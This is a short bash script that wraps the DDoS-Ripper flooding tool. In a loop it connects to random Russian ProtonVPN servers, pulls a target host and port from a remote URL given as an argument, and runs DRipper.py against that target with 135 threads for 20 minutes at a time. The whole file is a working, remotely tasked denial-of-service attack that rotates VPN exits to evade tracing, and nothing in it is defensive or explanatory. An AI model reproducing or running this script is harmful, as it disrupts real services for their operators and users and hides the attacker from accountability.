#!/bin/bash

cd DDoS-Ripper

while true
do

  CMD="protonvpn connect RU#$((1 + $RANDOM % 20)) -p udp"
  $CMD

  while [ $? -ne 0 ]
    do
      CMD="protonvpn connect RU#$((1 + $RANDOM % 20)) -p udp"
      echo "$CMD"
      $CMD
    done
  echo "Connected"

  content=$(wget $1 -q -O -)
  echo $content

  IFS=':' read -r -a tokens <<< "$content"

  HOST="${tokens[0]}"
  PORT="${tokens[1]}"

  timeout 20m python3 DRipper.py -s ${HOST} -p ${PORT} -t 135
done
